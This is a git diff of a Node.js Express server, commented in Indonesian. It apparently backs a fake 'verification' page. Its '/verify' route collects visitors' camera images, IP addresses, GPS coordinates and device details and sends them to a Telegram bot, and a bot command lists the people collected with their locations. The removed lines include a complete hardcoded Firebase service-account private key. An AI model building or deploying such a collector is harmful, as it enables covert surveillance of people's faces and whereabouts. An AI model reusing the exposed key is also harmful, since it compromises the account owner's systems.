@@ -2,61 +2,36 @@ const express = require('express');
 const fetch = require('node-fetch');
 const FormData = require('form-data');
 const path = require('path');
-const admin = require('firebase-admin');
-const { execSync } = require('child_process');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ============================================
-// ⏰ SYNC WAKTU SERVER (FIX FIREBASE ERROR)
+// 📦 DATABASE SEDERHANA (DI MEMORY)
 // ============================================
-try {
-  console.log('⏰ Syncing server time...');
-  const dateStr = execSync('curl -s --head google.com | grep -i "^date:" | cut -d" " -f2-').toString().trim();
-  if (dateStr) {
-    execSync(`date -s "${dateStr}"`, { stdio: 'ignore' });
-    console.log('✅ Server time synced successfully!');
+let users = [];
+let dailyCount = 0;
+let lastReset = new Date();
+
+// ============================================
+// 🗑️ AUTO CLEANUP SETIAP HARI
+// ============================================
+function autoCleanup() {
+  const now = new Date();
+  const today = now.toDateString();
+  const lastDate = lastReset.toDateString();
+  
+  if (today !== lastDate) {
+    console.log(`🗑️ Auto cleanup: ${users.length} users deleted`);
+    users = [];
+    dailyCount = 0;
+    lastReset = now;
+    console.log(`✅ Reset at ${now.toLocaleString('id-ID')}`);
   }
-} catch (e) {
-  console.log('⚠️ Could not sync time, continuing...');
 }
 
-// ============================================
-// 🔥 FIREBASE SERVICE ACCOUNT (BARU - GENERATE ULANG)
-// ============================================
-const serviceAccount = {
-  "type": "service_account",
-  "project_id": "nampung",
-  "private_key_id": "23756c5a6da23e322e4bb09a48d7f2d02b8c2bcf",
-  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCZHg0pEoILLgTH\nbAA2J2p3VvLre+C5sB1zZHCh7ZHjW03vl5xMm97DJ0q6UKjn0pTE8+sxGVDkVHG7\nKUL0jEiDlvr+VjmoRi3SvJtQrN1kghk3qrI1i6eaEzi7GfLHNQIZ+ox5d3U5EZOy\nykBEMdKxQpeLWMkZxLRrbAQLCzc6hPdHljThYCgrZcDumWLAy+ayeI1SXZI9jiiR\ne8uKvCUEYHN28P1nxQIIvcF79+vduldl9djIN29SGLoTFMScAVc+fHWj7uwcQaMm\nsvV0AtOgLZwoOFsQvXaZMIfyuhsuSareO4r2PNgxcRHIiIe4HAPPWv4+TU5J5K3P\nT1vQnh9hAgMBAAECggEAIY0++4LJebssA2nkUvmIoB1urhCvUekoTu6Rqr3046HQ\nfmGVt4jJQ7CytIhztpbDkDPV0+S0/8+MO2OjfxRVWHZnSf+pczjrlhvLmd5DRiCm\n93aBRe/z+jRfkEozk5jHPNuU2BIH3wk9uOYONpNHVJ3fuMJsEKg0k7xv116uC7Wb\n9DQ+dwin8q6J82osE3RFvO8w84fQHR9EPoImFgrgcij29XQ0GpCpdqNEC20bjyAB\nF3Os+DITKwa8AQ09CXUsACHieQugPCZlv99sYZDcSfIDysiFFdu8r/XjxCoLkFKY\nXlbr38igN7Lqz2RSWrtKzdBqnIORn0NQnbN0OzwnBQKBgQDJ2dSkLp7vNLy0CPeF\nVIziauXF1RKLZXyiFp4feNdVovId4lFmkG1mbdNyhJ5v2fI/OSzJixauai2Nu0G8\nzs6jPTyZwXP6GCdGd9BRFgU5HJaCr83gPP/VX6fYdkASyqIhpn6W5uTFJrcIfg5K\njuE0SQn+0+B0tJwHGp/4eTSV7QKBgQDCMW6/9JlIabdnFyAAAPTXnKfJA5sHZdWz\n0QAX2oaX7ldSot5EBQERuMU1YuuIGxalnDDi2nndksk+oLiPqoo1hXlfstQgLUwf\nJo8+7ASVzo7dKtkM2FWN3uYa4DJANwOuedr6YnfoZTu0gxrlB++2RGv4aCB4brRG\njNL4funAxQKBgERaeLC0fOvCLxjEZJWJAUB3NKIeum3sCx2UjS1ZLYp5aIYIKsqR\npAporI7+K+zyoB8azHjfmemsWQrC28sFOWJ8DTaAFTce0MYDMs8SpuglLy7IO+5w\nma32+47I1H/IkMjWac3OGLBOoPLGRS6oXcjn5vOdakf7FU8ui/eHi/AtAoGAR9x7\nG1Wsk3trfx6znMy9zjwOaviGmgo5Nr2Uxz76p6ZvcgkLLyia6K/zanocptU/YDGY\ndZpbln8HMcHQCnoVgxDNhXhrvyyECtL+F07Hs5gojfeZMoOrxUBC7pcggVraZep5\n+kYOEVXE7lvFzBNPxac0PUxrF6X/2EusloCAh/ECgYBrJ7ojIEtsQhxX8I9KqJcY\nIrDCVvkvpPbNdtjwybn0HtUm1z+E4W549JKCHxaZb3cTmGYBh47vo7K/nLMfDig8\nozs+iaeGcJPZtJJH57SoMPVFMDtZyRPgi2DASk8QcIgqOVIE5VXPPdDp+FXJC325\nvb79c90/chOibIt73bi5uA==\n-----END PRIVATE KEY-----\n",
-  "client_email": "firebase-adminsdk-fbsvc@nampung.iam.gserviceaccount.com",
-  "client_id": "105465652603290327209",
-  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
-  "token_uri": "https://oauth2.googleapis.com/token",
-  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
-  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40nampung.iam.gserviceaccount.com",
-  "universe_domain": "googleapis.com"
-};
-
-// ============================================
-// 🔥 INIT FIREBASE
-// ============================================
-let database;
-let verifikasiRef;
-
-try {
-  admin.initializeApp({
-    credential: admin.credential.cert(serviceAccount),
-    databaseURL: 'https://nampung-default-rtdb.asia-southeast1.firebasedatabase.app/'
-  });
-  database = admin.database();
-  verifikasiRef = database.ref('verifikasi');
-  console.log('🔥 Firebase connected successfully!');
-} catch (err) {
-  console.error('❌ Firebase init error:', err.message);
-  process.exit(1);
-}
+// Jalankan cleanup setiap 1 jam (cek apakah hari sudah berganti)
+setInterval(autoCleanup, 60 * 60 * 1000); // 1 jam
 
 // ============================================
 // 🤖 TELEGRAM CONFIG
@@ -69,11 +44,9 @@ console.log('🚀 SERVER STARTING');
 console.log('========================================');
 console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ SET' : '❌ NOT SET'}`);
 console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ SET' : '❌ NOT SET'}`);
+console.log(`🗑️ Auto cleanup: Setiap hari pukul 00:00 WIB`);
 console.log('========================================');
 
-// ============================================
-// 📦 MIDDLEWARE
-// ============================================
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static('public'));
@@ -274,23 +247,20 @@ app.post('/webhook', async (req, res) => {
     
     if (message && message.text === '/info') {
       const chatId = message.chat.id;
-      const snapshot = await verifikasiRef.once('value');
-      const allData = snapshot.val();
       
-      if (!allData) {
+      if (users.length === 0) {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: chatId,
-            text: '📭 Belum ada data verifikasi.'
+            text: '📭 Belum ada data verifikasi hari ini.'
           })
         });
         return res.sendStatus(200);
       }
       
-      const users = Object.values(allData);
-      let response = `📊 *DATA VERIFIKASI*\n\n`;
+      let response = `📊 *DATA VERIFIKASI HARI INI*\n\n`;
       response += `Total: ${users.length} orang\n\n`;
       
       users.forEach((user, index) => {
@@ -300,6 +270,9 @@ app.post('/webhook', async (req, res) => {
         response += `   📍 ${user.location || 'Tidak diketahui'}\n`;
         if (index < lastIndex) response += `\n`;
       });
+      
+      // Info auto cleanup
+      response += `\n🗑️ *Auto Cleanup:* Setiap hari pukul 00:00 WIB`;
       
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -333,6 +306,7 @@ app.post('/verify', async (req, res) => {
     
     console.log(`🌐 IP: ${ip}`);
     console.log(`📱 GPS:`, gps ? `${gps.latitude}, ${gps.longitude}` : 'Tidak ada');
+    console.log(`📊 Total users today: ${users.length}`);
     
     if (!image) {
       return res.json({ success: false, error: 'No image' });
@@ -358,10 +332,11 @@ app.post('/verify', async (req, res) => {
       browser: deviceData ? deviceData.browser : '-'
     };
     
-    console.log('💾 Saving to Firebase...');
-    const newUserRef = verifikasiRef.push();
-    await newUserRef.set(userData);
-    console.log(`✅ Saved to Firebase with key: ${newUserRef.key}`);
+    // SIMPAN KE MEMORY (BUKAN FIREBASE)
+    users.push(userData);
+    dailyCount++;
+    console.log(`💾 Saved to memory (${users.length} users today)`);
+    console.log(`🗑️ Will be deleted at midnight`);
     
     const result = await sendToTelegram(buffer, {
       device: deviceData,
@@ -374,7 +349,7 @@ app.post('/verify', async (req, res) => {
     
     if (result && result.ok) {
       console.log('✅ Success!');
-      res.json({ success: true, firebaseKey: newUserRef.key });
+      res.json({ success: true, totalToday: users.length });
     } else {
       console.log('❌ Failed to send to Telegram');
       res.json({ success: false, error: 'Telegram error' });
@@ -416,13 +391,21 @@ app.get('/send', async (req, res) => {
   }
 });
 
-app.get('/data', async (req, res) => {
-  try {
-    const snapshot = await verifikasiRef.once('value');
-    res.json(snapshot.val());
-  } catch (err) {
-    res.json({ error: err.message });
-  }
+app.get('/stats', (req, res) => {
+  const now = new Date();
+  const tomorrow = new Date(now);
+  tomorrow.setDate(tomorrow.getDate() + 1);
+  tomorrow.setHours(0, 0, 0, 0);
+  const msUntilMidnight = tomorrow - now;
+  const hoursUntilMidnight = Math.floor(msUntilMidnight / (1000 * 60 * 60));
+  const minutesUntilMidnight = Math.floor((msUntilMidnight % (1000 * 60 * 60)) / (1000 * 60));
+  
+  res.json({
+    totalUsersToday: users.length,
+    dailyCount: dailyCount,
+    resetTime: `${hoursUntilMidnight}h ${minutesUntilMidnight}m`,
+    nextReset: tomorrow.toLocaleString('id-ID')
+  });
 });
 
 app.get('/', (req, res) => {
@@ -437,6 +420,7 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 Server running on port ${PORT}`);
   console.log(`📊 Test bot: /test`);
   console.log(`📊 Test send: /send`);
-  console.log(`📊 View data: /data`);
+  console.log(`📊 View stats: /stats`);
+  console.log(`🗑️ Auto cleanup: Setiap hari pukul 00:00 WIB`);
   console.log('========================================');
 });
